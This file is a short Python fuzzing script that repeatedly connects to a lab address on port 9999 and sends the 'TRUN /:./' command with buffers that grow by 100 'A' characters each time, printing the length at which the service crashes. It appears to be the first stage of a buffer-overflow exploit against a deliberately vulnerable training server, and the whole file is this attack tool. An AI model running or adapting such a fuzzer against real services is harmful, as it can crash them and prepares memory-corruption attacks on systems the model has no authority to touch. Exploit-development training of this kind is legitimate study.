#!/usr/bin/python3
import sys, socket
from time import sleep

buffer = "A" * 100


while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
		s.connect(('10.0.2.40', 9999))
			
		
		payload = 'TRUN /:./' + buffer
		s.send((payload.encode()))
		
		sleep(2)
		
		buffer = buffer + "A" * 100
	
	except Exception as e:
			print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
			print(f"Error: {e}")
			sys.exit()
	